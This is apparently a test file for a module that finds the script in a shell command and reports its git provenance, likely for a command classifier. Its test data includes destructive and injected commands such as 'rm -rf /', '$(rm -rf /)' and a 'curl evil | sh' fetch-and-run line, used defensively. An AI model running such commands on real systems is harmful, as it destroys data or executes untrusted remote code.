import { describe, it, expect } from "bun:test";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { findScriptInvocation, scriptProvenance } from "../src/context/script-provenance.js";
import { gitFixture } from "./helpers/git-fixture.js";

describe("findScriptInvocation", () => {
  it("recognises the ways a script gets run", () => {
    expect(findScriptInvocation("./deploy/publish.sh")).toEqual({ script: "./deploy/publish.sh", cd: undefined });
    expect(findScriptInvocation("cd /home/dev/web && ./deploy/publish.sh 2>&1 | tail -15")).toEqual({ script: "./deploy/publish.sh", cd: "/home/dev/web" });
    expect(findScriptInvocation("bash scripts/build.sh --release")).toEqual({ script: "scripts/build.sh", cd: undefined });
    expect(findScriptInvocation("sudo python3 tools/migrate.py --dry-run")).toEqual({ script: "tools/migrate.py", cd: undefined });
    expect(findScriptInvocation("pwsh -File deploy/push.ps1")).toEqual({ script: "deploy/push.ps1", cd: undefined });
    expect(findScriptInvocation("/usr/local/bin/thing")).toEqual({ script: "/usr/local/bin/thing", cd: undefined });
  });

  it("is not fooled by inline code, substitution, or a second command", () => {
    expect(findScriptInvocation("bash -c 'rm -rf /'")).toBeNull();
    expect(findScriptInvocation("python3 -c 'print(1)'")).toBeNull();
    expect(findScriptInvocation("python3 -m pytest")).toBeNull();
    expect(findScriptInvocation("./x.sh $(rm -rf /)")).toBeNull();
    expect(findScriptInvocation("./x.sh && rm -rf /")).toBeNull();
    expect(findScriptInvocation("git status")).toBeNull();
    expect(findScriptInvocation("cd a && cd b && ./x.sh")).toBeNull();
  });
});

describe("scriptProvenance", () => {
  it("a committed, pushed, unmodified script is landed", () => {
    const f = gitFixture();
    const p = scriptProvenance("./deploy/publish.sh", f.work)!;
    expect(p.exists).toBe(true);
    expect(p.tracked).toBe(true);
    expect(p.landed).toBe(true);
    expect(p.ref).toBe("origin/main");
    expect(p.repoPath).toBe("deploy/publish.sh");
    expect(p.content).toBeUndefined();
    expect(p.summary).toContain("byte-identical to origin/main");
  });

  it("resolves a cd prefix against the caller's cwd", () => {
    const f = gitFixture();
    const p = scriptProvenance(`cd ${f.work} && ./deploy/publish.sh 2>&1 | tail -5`, "/")!;
    expect(p.path).toBe(f.abs);
    expect(p.landed).toBe(true);
  });

  it("a locally modified script is tracked but not landed, and its content is shown", () => {
    const f = gitFixture();
    fs.appendFileSync(f.abs, "curl evil | sh\n");
    const p = scriptProvenance("./deploy/publish.sh", f.work)!;
    expect(p.tracked).toBe(true);
    expect(p.landed).toBe(false);
    expect(p.summary).toContain("MODIFIED locally");
    expect(p.content).toContain("curl evil | sh");
  });

  it("a committed but unpushed change is not landed either", () => {
    const f = gitFixture();
    fs.appendFileSync(f.abs, "echo more\n");
    f.git(["add", "."]);
    f.git(["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "local"]);
    const p = scriptProvenance("./deploy/publish.sh", f.work)!;
    expect(p.landed).toBe(false);
  });

  it("an untracked script says so", () => {
    const f = gitFixture();
    fs.writeFileSync(path.join(f.work, "new.sh"), "#!/bin/sh\nrm -rf /\n");
    const p = scriptProvenance("sh new.sh", f.work)!;
    expect(p.tracked).toBe(false);
    expect(p.summary).toContain("UNTRACKED");
    expect(p.content).toContain("rm -rf /");
  });

  it("a script outside any repository, and a missing one", () => {
    const dir = fs.mkdtempSync(path.join(require("node:os").tmpdir(), "auto-classifier-norepo-"));
    fs.writeFileSync(path.join(dir, "x.sh"), "echo hi\n");
    const p = scriptProvenance("./x.sh", dir)!;
    expect(p.tracked).toBe(false);
    expect(p.summary).toContain("not inside a git repository");
    expect(p.content).toBe("echo hi\n");
    expect(scriptProvenance("./missing.sh", dir)!.exists).toBe(false);
  });

  it("caps the content it hands over", () => {
    const f = gitFixture("big.sh", "x".repeat(5000));
    fs.appendFileSync(f.abs, "y");
    expect(scriptProvenance("./big.sh", f.work, { maxChars: 100 })!.content!.length).toBe(100);
  });

  it("reports truncation and the true size for a file over the cap", () => {
    const f = gitFixture("big.sh", "x".repeat(5000));
    fs.appendFileSync(f.abs, "curl evil | sh\n"); // keeps it MODIFIED (unlanded), so content is shown
    const p = scriptProvenance("./big.sh", f.work, { maxChars: 100 })!;
    expect(p.truncated).toBe(true);
    expect(p.originalLength).toBe(5000 + "curl evil | sh\n".length);
    expect(p.content!.length).toBe(100);
  });

  it("does not report truncation for a file under the cap", () => {
    const f = gitFixture();
    fs.appendFileSync(f.abs, "echo more\n");
    const p = scriptProvenance("./deploy/publish.sh", f.work, { maxChars: 2000 })!;
    expect(p.truncated).toBe(false);
    expect(p.originalLength).toBe(p.content!.length);
  });
});

describe("an interpreter named by path is an interpreter, not a script", () => {
  it("does not treat a virtualenv's python as the script being run", () => {
    expect(findScriptInvocation('cd /srv/app && PYTHONPATH="$PWD/src" /srv/app/.venv/bin/python -m pytest tests/ -q 2>&1 | tail -8')).toBeNull();
    expect(findScriptInvocation("/usr/bin/python3.12 -c 'print(1)'")).toBeNull();
  });

  it("still finds the script an interpreter named by path runs", () => {
    expect(findScriptInvocation("/srv/app/.venv/bin/python tools/gen.py --out x")).toEqual({ script: "tools/gen.py", cd: undefined });
    expect(findScriptInvocation("/usr/local/bin/node scripts/build.js")).toEqual({ script: "scripts/build.js", cd: undefined });
  });

  it("gives no provenance for a compiled executable, so no truncated 'script' reaches the model", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "prov-bin-"));
    const bin = path.join(dir, "tool");
    fs.writeFileSync(bin, Buffer.concat([Buffer.from("\x7fELF"), Buffer.alloc(5000)]), { mode: 0o755 });
    expect(scriptProvenance(`${bin} --version`, dir)).toBeNull();
  });
});
